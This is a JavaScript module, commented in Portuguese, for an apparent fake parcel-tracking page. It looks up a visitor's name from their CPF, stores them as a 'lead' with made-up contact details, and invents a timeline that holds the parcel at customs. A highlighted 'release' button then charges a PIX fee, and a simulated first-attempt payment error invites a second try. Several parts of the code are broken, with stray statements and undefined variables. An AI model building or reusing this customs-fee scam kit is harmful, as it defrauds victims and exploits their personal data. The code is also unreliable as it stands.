/**
 * Sistema principal de rastreamento - VERSÃO ATUALIZADA COM ZENTRA PAY OFICIAL
 */
import { CPFValidator } from '../utils/cpf-validator.js';
import { DataService } from '../utils/data-service.js';
import { TrackingGenerator } from '../utils/tracking-generator.js';
import { UIHelpers } from '../utils/ui-helpers.js';
import { ZentraPayService } from '../services/zentra-pay.js';
import { RealTimeTrackingSystem } from '../utils/real-time-tracking.js';
import { DatabaseService } from '../services/database.js';

export class TrackingSystem {
    constructor() {
        this.currentCPF = null;
        this.trackingData = null;
        this.userData = null;
        this.dataService = new DataService();
        this.zentraPayService = new ZentraPayService();
        this.realTimeTracking = new RealTimeTrackingSystem();
        this.dbService = new DatabaseService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        this.leadData = null;
        this.timelineUpdateInterval = null;
        
        console.log('TrackingSystem inicializado com Zentra Pay oficial');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Múltiplos fallbacks para garantir inicialização
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            
            // Validar configuração da API
            this.validateZentraPaySetup();
            
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        const isValid = this.zentraPayService.validateApiSecret();
        if (isValid) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        
        // Form submission - MÚLTIPLAS ESTRATÉGIAS
        this.setupFormSubmission();
        
        // CPF input
        this.setupCPFInput();
        
        // Track button - CONFIGURAÇÃO ESPECÍFICA
        this.setupTrackButton();
        
        // Modal events
        this.setupModalEvents();
        
        // Copy buttons
        this.setupCopyButtons();
        
        // Accordion
        this.setupAccordion();
        
        // Keyboard events
        this.setupKeyboardEvents();
        
        console.log('Event listeners configurados');
    }

    setupFormSubmission() {
        // Estratégia 1: Form por ID
        const trackingForm = document.getElementById('trackingForm');
        if (trackingForm) {
            console.log('Form encontrado por ID');
            trackingForm.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        // Estratégia 2: Todos os forms na página
        const allForms = document.querySelectorAll('form');
        allForms.forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        // Estratégia 1: Por ID específico
        const trackButtonById = document.getElementById('trackButton');
        if (trackButtonById) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButtonById);
        }

        // Estratégia 2: Por classe
        const trackButtonsByClass = document.querySelectorAll('.track-button');
        trackButtonsByClass.forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        // Estratégia 3: Por tipo e texto
        const allButtons = document.querySelectorAll('button[type="submit"], button');
        allButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        // Estratégia 4: Delegação de eventos no documento
        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        // Remover listeners existentes
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        // Configurar novo listener
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        // Garantir que o botão seja clicável
        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        // Configurar tipo se necessário
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');

        // Input event para máscara
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        // Keypress para prevenir caracteres não numéricos
        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        // Enter key para submeter
        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        // Paste event
        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const paste = (e.clipboardData || window.clipboardData).getData('text');
            const numbersOnly = paste.replace(/[^\d]/g, '');
            if (numbersOnly.length <= 11) {
                cpfInput.value = numbersOnly;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        // Focus event
        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) || 
            (e.keyCode === 65 && e.ctrlKey) || // Ctrl+A
            (e.keyCode === 67 && e.ctrlKey) || // Ctrl+C
            (e.keyCode === 86 && e.ctrlKey) || // Ctrl+V
            (e.keyCode === 88 && e.ctrlKey)) { // Ctrl+X
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;
        
        const cpfValue = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cpfValue.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cpfValue.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO PROCESSO DE RASTREAMENTO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            UIHelpers.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }
        
        const cpfInputValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfInputValue);
        
        console.log('CPF digitado:', cpfInputValue);
        console.log('CPF limpo:', cleanCPF);
        
        if (!CPFValidator.isValidCPF(cpfInputValue)) {
            console.log('CPF inválido');
            UIHelpers.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, iniciando busca...');

        // Mostrar loading
        UIHelpers.showLoadingNotification();

        // Desabilitar todos os botões de rastreamento
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Simular delay de processamento
            await new Promise(resolve => setTimeout(resolve, 3000));
            
            console.log('Buscando dados do CPF...');
            
            // Buscar dados do CPF
            const cpfData = await this.dataService.fetchCPFData(cleanCPF);
            
            if (cpfData && cpfData.DADOS) {
                console.log('Dados do CPF encontrados:', cpfData.DADOS);
                this.currentCPF = cleanCPF;
                this.userData = cpfData.DADOS;
                
                // Buscar ou criar lead no banco de dados
                await this.handleLeadData(cleanCPF, cpfData.DADOS);
                
                UIHelpers.closeLoadingNotification();
                
                setTimeout(() => {
                    console.log('Exibindo resultados...');
                    this.displayOrderDetails();
                    this.generateRealTimeTrackingData();
                    this.displayTrackingResults();
                    this.startTimelineUpdates();
                    
                    // Scroll para os resultados
                    const orderDetails = document.getElementById('orderDetails');
                    if (orderDetails) {
                        UIHelpers.scrollToElement(orderDetails, 100);
                    }
                    
                    // Destacar botão de liberação após delay
                    setTimeout(() => {
                        this.highlightLiberationButton();
                        this.addAdminControls();
                    }, 1500);
                }, 300);
            } else {
                console.log('CPF não encontrado');
                UIHelpers.closeLoadingNotification();
                UIHelpers.showError('CPF não encontrado. Tente novamente.');
            }
        } catch (error) {
            console.error('Erro no processo:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            // Restaurar botões
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async handleLeadData(cpf, userData) {
        try {
            // Buscar lead existente
            const existingLead = await this.dbService.getLeadByCPF(cpf);
            
            if (existingLead.success && existingLead.data) {
                console.log('📋 Lead existente encontrado');
                this.leadData = existingLead.data;
            } else {
                console.log('📋 Criando novo lead');
                // Criar novo lead com timestamp inicial
                const newLeadData = {
                    nome_completo: userData.nome,
                    cpf: cpf,
                    email: `${userData.nome.toLowerCase().replace(/\s+/g, '.')}@email.com`,
                    telefone: `(11) 9${cpf.slice(-8)}`,
                    endereco: 'Endereço não informado',
                    valor_total: 67.90,
                    meio_pagamento: 'PIX',
                    origem: 'direto',
                    etapa_atual: 1,
                    status_pagamento: 'pendente',
                    initial_timestamp: new Date().toISOString(),
                    produtos: [{ nome: 'Kit 12 caixas organizadoras + brinde', preco: 67.90 }]
                };
                
                const result = await this.dbService.createLead(newLeadData);
                if (result.success) {
                    this.leadData = result.data;
                    console.log('✅ Novo lead criado com sucesso');
                }
            }
        } catch (error) {
            console.error('❌ Erro ao processar lead:', error);
        }
    }

    displayOrderDetails() {
        if (!this.userData) return;
        
        const shortName = this.getFirstAndLastName(this.userData.nome);
        const formattedCPF = CPFValidator.formatCPF(this.userData.cpf);
        
        // Atualizar elementos da interface
        this.updateElement('customerName', shortName);
        this.updateElement('fullName', this.userData.nome);
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', shortName);
        
        // Mostrar seções
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTimeTrackingData() {
        const initialTimestamp = this.leadData?.initial_timestamp || new Date().toISOString();
        console.log('⏰ Gerando timeline baseada em:', initialTimestamp);
        
        // Gerar timeline em tempo real
        const timeline = this.realTimeTracking.generateTimeline(initialTimestamp);
        
        this.trackingData = {
            cpf: this.userData.cpf,
            currentStep: 'customs',
            steps: timeline,
            liberationPaid: this.leadData?.status_pagamento === 'pago' || false,
            liberationDate: null,
            deliveryAttempts: 0,
            lastUpdate: new Date().toISOString(),
            initialTimestamp: initialTimestamp
        };
        
        console.log('📊 Timeline gerada:', this.trackingData.steps.length, 'etapas');
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        
        // Animar timeline
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }
            this.addStepControlButtons();
    startTimelineUpdates() {
        // Verificar atualizações a cada 30 segundos
        this.timelineUpdateInterval = setInterval(() => {
            this.checkForTimelineUpdates();
        }, 30000);
        
        console.log('⏰ Sistema de atualizações em tempo real iniciado');
    }

    checkForTimelineUpdates() {
        if (!this.trackingData || !this.trackingData.steps) return;
        
        const hasNewSteps = this.realTimeTracking.checkForNewSteps(this.trackingData.steps);
        
        if (hasNewSteps) {
            console.log('🆕 Novas etapas detectadas, atualizando interface');
            this.updateTimelineDisplay();
            this.saveTimelineToDatabase();
        }
    }

    updateTimelineDisplay() {
        // Re-renderizar timeline
        this.renderTimeline();
        
        // Animar novas etapas
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 100);
        
        // Atualizar status
        this.updateStatus();
    }

    async saveTimelineToDatabase() {
        if (this.leadData && this.trackingData) {
            try {
                await this.dbService.updateLeadTimeline(this.leadData.cpf, this.trackingData.steps);
                console.log('💾 Timeline salva no banco de dados');
            } catch (error) {
                console.error('❌ Erro ao salvar timeline:', error);
            }
        }
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        const status = this.realTimeTracking.getCurrentStatus(this.trackingData.steps);
        
        if (status.includes('alfândega')) {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
            currentStatus.textContent = status;
        } else {
            statusIcon.innerHTML = '<i class="fas fa-shipping-fast"></i>';
            statusIcon.className = 'status-icon in-transit';
            currentStatus.textContent = status;
        }
    }

    addStepControlButtons() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;
        
        // Remove botões existentes se houver
        const existingControls = document.getElementById('stepControlsContainer');
        if (existingControls) {
            existingControls.remove();
            timeline.appendChild(timelineItem);
        });
        
        // Adicionar botão de teste provisório
        this.addTestNextStepButton(timeline);
    }

    addTestNextStepButton(timeline) {
        // Criar container para o botão de teste
        const controlsContainer = document.createElement('div');
        controlsContainer.id = 'stepControlsContainer';
        controlsContainer.style.cssText = `
            background: #f8f9fa;
            border: 2px dashed #dee2e6;
            border-radius: 12px;
            padding: 20px;
            margin: 30px 0;
            text-align: center;
            animation: fadeIn 0.5s ease;
        `;
        
        testContainer.innerHTML = `
            <div style="margin-bottom: 15px;">
                <i class="fas fa-flask" style="color: #6c757d; font-size: 1.5rem; margin-bottom: 10px;"></i>
                <p style="margin: 0; color: #6c757d; font-size: 0.9rem; font-weight: 600;">
                    🧪 CONTROLES DE TESTE
                </p>
                <p style="margin: 5px 0 0 0; color: #868e96; font-size: 0.8rem;">
                    Simula que o tempo passou para a próxima etapa
                </p>
            </div>
            <button id="testNextStepButton" class="test-next-step-button">
                <i class="fas fa-forward"></i> Próxima Etapa
            </button>
        `;
        
        timeline.appendChild(testContainer);
        
        // Adicionar estilos do botão
        this.addTestButtonStyles();
        
        // Configurar evento do botão
        const testButton = document.getElementById('testNextStepButton');
        if (testButton) {
            testButton.addEventListener('click', () => {
                this.simulateNextTimeStep();
            });
        }
    }
    
    addTestButtonStyles() {
        if (document.getElementById('testButtonStyles')) return;
        
        const style = document.createElement('style');
        style.id = 'testButtonStyles';
        style.textContent = `
            .test-next-step-button {
                background: linear-gradient(45deg, #6c757d, #5a6268);
                color: white;
                border: none;
                padding: 12px 25px;
                font-size: 1rem;
                font-weight: 700;
                border-radius: 25px;
                cursor: pointer;
                transition: all 0.3s ease;
                box-shadow: 0 4px 15px rgba(108, 117, 125, 0.3);
                font-family: 'Roboto', sans-serif;
                letter-spacing: 0.5px;
                display: inline-flex;
                align-items: center;
                gap: 8px;
            }
            
            .test-next-step-button:hover {
                background: linear-gradient(45deg, #5a6268, #495057);
                transform: translateY(-2px);
                box-shadow: 0 6px 20px rgba(108, 117, 125, 0.4);
            }
            
            .test-next-step-button:active {
                transform: translateY(0);
                box-shadow: 0 4px 15px rgba(108, 117, 125, 0.3);
            }
            
            .test-next-step-button i {
                font-size: 0.9rem;
            }
            
            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(20px); }
                to { opacity: 1; transform: translateY(0); }
            }
        `;
        document.head.appendChild(style);
    }
    
    simulateNextTimeStep() {
        if (!this.trackingData || !this.trackingData.steps) return;
        
        // Encontrar próxima etapa não completada
        const nextStep = this.trackingData.steps.find(step => !step.completed);
        
        if (nextStep) {
            // Marcar como completada e ajustar timestamp para agora
            nextStep.completed = true;
            nextStep.date = new Date();
            
            console.log('🧪 Etapa simulada para teste:', nextStep.title);
            
            // Atualizar interface
            this.updateTimelineDisplay();
            this.saveTimelineToDatabase();
            
            // Feedback visual no botão
            const testButton = document.getElementById('testNextStepButton');
            if (testButton) {
                const originalText = testButton.innerHTML;
                testButton.innerHTML = '<i class="fas fa-check"></i> Avançado!';
                testButton.style.background = 'linear-gradient(45deg, #28a745, #20c997)';
                testButton.disabled = true;
                
                setTimeout(() => {
                    testButton.innerHTML = originalText;
                    testButton.style.background = '';
                    testButton.disabled = false;
                }, 2000);
            }
            
            // Scroll para a nova etapa
            setTimeout(() => {
                const completedSteps = document.querySelectorAll('.timeline-item.completed');
                const lastCompleted = completedSteps[completedSteps.length - 1];
                if (lastCompleted) {
                    lastCompleted.scrollIntoView({ 
                        behavior: 'smooth', 
                        block: 'center' 
                    });
                }
            }, 500);
            
        } else {
            console.log('⚠️ Todas as etapas já foram completadas');
            
            // Feedback quando não há mais etapas
            const testButton = document.getElementById('testNextStepButton');
            if (testButton) {
                const originalText = testButton.innerHTML;
                testButton.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Todas Completas';
                testButton.style.background = 'linear-gradient(45deg, #ffc107, #fd7e14)';
                testButton.disabled = true;
                
                setTimeout(() => {
                    testButton.innerHTML = originalText;
                    testButton.style.background = '';
                    testButton.disabled = false;
                }, 3000);
            }
        }
    }
    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;
        
        const date = new Date(step.date);
        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
        
        let buttonHtml = '';
        if (step.needsLiberation && !this.trackingData.liberationPaid) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-step-id="${step.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }
        
        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${step.isChina ? `<span class="china-tag">China</span>` : ''}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;
        
        // Configurar botão de liberação
        if (step.needsLiberation && !this.trackingData.liberationPaid) {
            const liberationButton = item.querySelector('.liberation-button-timeline');
            if (liberationButton) {
                liberationButton.addEventListener('click', () => {
                    this.openLiberationModal();
                });
            }
        }
        
        return item;
    }

    addAdminControls() {
        // Adicionar controles de admin apenas em desenvolvimento
        if (window.location.hostname === 'localhost' || window.location.hostname.includes('127.0.0.1')) {
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;
            
            const adminControls = document.createElement('div');
            adminControls.className = 'admin-controls';
            adminControls.style.cssText = `
                background: #f8f9fa;
                border: 2px dashed #dee2e6;
                border-radius: 8px;
                padding: 15px;
                margin: 20px 0;
                text-align: center;
            `;
            
            adminControls.innerHTML = `
                <p style="margin: 0 0 10px 0; color: #6c757d; font-size: 0.9rem;">
                    <strong>🔧 Controles de Admin (apenas em desenvolvimento)</strong>
                </p>
                <button id="simulateNextStep" class="liberation-button-timeline" style="background: #6c757d; font-size: 0.9rem;">
                    <i class="fas fa-forward"></i> Simular Próxima Etapa
                </button>
            `;
            
            timeline.appendChild(adminControls);
            
            // Configurar evento do botão
            const simulateButton = document.getElementById('simulateNextStep');
            if (simulateButton) {
                simulateButton.addEventListener('click', () => {
                    this.simulateNextStep();
                });
            }
        }
    }

    simulateNextStep() {
        if (!this.trackingData || !this.trackingData.steps) return;
        
        const success = this.realTimeTracking.simulateNextStep(this.trackingData.steps);
        
        if (success) {
            console.log('🔄 Próxima etapa simulada');
            this.updateTimelineDisplay();
            this.saveTimelineToDatabase();
            
            // Feedback visual
            const button = document.getElementById('simulateNextStep');
            if (button) {
                const originalText = button.innerHTML;
                button.innerHTML = '<i class="fas fa-check"></i> Simulado!';
                button.style.background = '#28a745';
                
                setTimeout(() => {
                    button.innerHTML = originalText;
                    button.style.background = '#6c757d';
                }, 2000);
            }
        } else {
            console.log('⚠️ Todas as etapas já foram completadas');
        }
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            UIHelpers.scrollToElement(liberationButton, window.innerHeight / 2);
            
            setTimeout(() => {
                liberationButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
                liberationButton.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.8)';
                
                setTimeout(() => {
                    liberationButton.style.animation = 'pulse 2s infinite';
                    liberationButton.style.boxShadow = '0 4px 15px rgba(255, 107, 53, 0.4)';
                }, 6000);
            }, 500);
        }
    }

    setupModalEvents() {
        // Liberation modal
        const closeModal = document.getElementById('closeModal');
        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeModal('liberationModal');
            });
        }

        // Delivery modal
        const closeDeliveryModal = document.getElementById('closeDeliveryModal');
        if (closeDeliveryModal) {
            closeDeliveryModal.addEventListener('click', () => {
                this.closeModal('deliveryModal');
            });
        }

        // Modal overlay clicks
        ['liberationModal', 'deliveryModal'].forEach(modalId => {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target.id === modalId) {
                        this.closeModal(modalId);
                    }
                });
            }
        });
    }

    setupCopyButtons() {
        const copyButtons = [
            { buttonId: 'copyPixButtonModal', inputId: 'pixCodeModal' },
            { buttonId: 'copyPixButtonDelivery', inputId: 'pixCodeDelivery' }
        ];

        copyButtons.forEach(({ buttonId, inputId }) => {
            const button = document.getElementById(buttonId);
            if (button) {
                button.addEventListener('click', () => {
                    this.copyPixCode(inputId, buttonId);
                });
            }
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => {
                this.toggleAccordion();
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal('liberationModal');
                this.closeModal('deliveryModal');
                UIHelpers.closeLoadingNotification();
            }
        });
    }

    async openLiberationModal() {
        console.log('🚀 Iniciando processo de geração de PIX via Zentra Pay...');
        UIHelpers.showLoadingNotification();
        
        try {
            // Validar configuração antes de prosseguir
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }
            
            // Valor em reais - você pode configurar esta variável
            const valorEmReais = window.valor_em_reais || 26.34; // R$ 26,34
            
            console.log('💰 Valor da transação:', `R$ ${valorEmReais.toFixed(2)}`);
            console.log('👤 Dados do usuário:', {
                nome: this.userData.nome,
                cpf: this.userData.cpf
            });
            
            console.log('📡 Enviando requisição para Zentra Pay...');
            const pixResult = await this.zentraPayService.createPixTransaction(
                this.userData, 
                valorEmReais
            );
            
            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso via API oficial Zentra Pay!');
                console.log('📋 Dados recebidos:', {
                    transactionId: pixResult.transactionId,
                    externalId: pixResult.externalId,
                    pixPayload: pixResult.pixPayload,
                    email: pixResult.email,
                    telefone: pixResult.telefone,
                    paymentMethod: pixResult.paymentMethod,
                    valor: pixResult.valor
                });
                
                this.pixData = pixResult;
                
                UIHelpers.closeLoadingNotification();
                
                // Aguardar um pouco antes de mostrar o modal
                setTimeout(() => {
                    this.displayRealPixModal();
                    
                    // Guiar atenção para o botão copiar após modal abrir
                    setTimeout(() => {
                        this.guideToCopyButton();
                    }, 800);
                this.initializePostPaymentSystem();
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro desconhecido ao gerar PIX');
            }
            
        } catch (error) {
            console.error('💥 Erro ao gerar PIX via Zentra Pay:', error);
            UIHelpers.closeLoadingNotification();
            
            // Mostrar erro específico para o usuário
            UIHelpers.showError(`Erro ao gerar PIX: ${error.message}`);
            
            // Fallback para modal estático em caso de erro
            setTimeout(() => {
                console.log('⚠️ Exibindo modal estático como fallback');
                this.displayStaticPixModal();
                
                setTimeout(() => {
                    this.guideToCopyButton();
                }, 800);
            }, 1000);
        }
    }
    
    // Mostrar erro de pagamento
    showPaymentError() {
        this.paymentErrorShown = true;
        
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'paymentErrorOverlay';
        errorOverlay.className = 'modal-overlay';
        errorOverlay.style.display = 'flex';
        
        errorOverlay.innerHTML = `
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(errorOverlay);
        document.body.style.overflow = 'hidden';
        
        // Configurar eventos
        const closeButton = document.getElementById('closePaymentErrorModal');
        const retryButton = document.getElementById('retryPaymentButton');
        
        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }
        
        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                this.openLiberationModal();
            });
        }
        
        // Fechar ao clicar fora
        errorOverlay.addEventListener('click', (e) => {
            if (e.target === errorOverlay) {
                this.closePaymentErrorModal();
            }
        });
    }
    
    closePaymentErrorModal() {
        const errorOverlay = document.getElementById('paymentErrorOverlay');
        if (errorOverlay) {
            errorOverlay.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorOverlay.parentNode) {
                    errorOverlay.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    displayRealPixModal() {
        console.log('🎯 Exibindo modal com dados reais do PIX...');
        
        // Atualizar QR Code com dados reais
        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && this.pixData.pixPayload) {
            // Gerar QR Code a partir do payload PIX real
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
            console.log('✅ QR Code atualizado com dados reais da API oficial');
            console.log('🔗 URL do QR Code:', qrCodeUrl);
        }
        
        // Atualizar código PIX Copia e Cola com pix.payload REAL
        const pixCodeInput = document.getElementById('pixCodeModal');
        if (pixCodeInput && this.pixData.pixPayload) {
            pixCodeInput.value = this.pixData.pixPayload;
            console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
            console.log('📋 PIX Payload Real:', this.pixData.pixPayload);
            console.log('📏 Tamanho do payload:', this.pixData.pixPayload.length, 'caracteres');
        }
        
        // Mostrar modal
        const liberationModal = document.getElementById('liberationModal');
        if (liberationModal) {
            liberationModal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('🎯 Modal PIX real exibido com sucesso');
            
            // Simular pagamento para testes
            this.addPaymentSimulationButton();
        }
        
        // Log de confirmação final
        console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
        console.log('💳 Transação ID:', this.pixData.transactionId);
        console.log('🔢 External ID:', this.pixData.externalId);
        console.log('💰 Valor:', `R$ ${this.pixData.valor.toFixed(2)}`);
    }
    
    // Adicionar botão de simulação de pagamento
    addPaymentSimulationButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (!modalContent) return;
        
        // Verificar se o botão já existe
        if (document.getElementById('simulatePaymentButton')) return;
        
        const simulationSection = document.createElement('div');
        simulationSection.style.cssText = `
            margin-top: 30px;
            padding-top: 20px;
            background: #f8f9fa;
            text-align: center;
        `;
        
        simulationSection.innerHTML = `
            <p style="margin-bottom: 15px; color: #6c757d; font-size: 14px;">
                Apenas para testes:
            </p>
            <button id="simulatePaymentButton" class="professional-copy-button" style="background: #6c757d;">
                <i class="fas fa-bolt"></i> Simular Pagamento
            </button>
        `;
        
        modalContent.appendChild(simulationSection);
        
        // Adicionar evento
        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulatePayment();
            });
        }
    }
    
    // Simular pagamento
    simulatePayment() {
        // Fechar modal de pagamento
        this.closeModal('liberationModal');
        
        // Incrementar contador de tentativas
        this.paymentRetryCount++;
        
        // Se for a primeira tentativa, mostrar erro
        if (this.paymentRetryCount === 1) {
            setTimeout(() => {
                this.showPaymentError();
            }, 1000);
        } else {
            // Se for a segunda tentativa, processar pagamento com sucesso
            this.paymentRetryCount = 0;
            this.processSuccessfulPayment();
        }
    }
    
    // Processar pagamento com sucesso
    processSuccessfulPayment() {
        // Marcar como pago
        if (this.trackingData) {
            this.trackingData.liberationPaid = true;
        }
        
        // Atualizar interface
        const liberationButton = document.querySelector('.liberation-button-timeline');
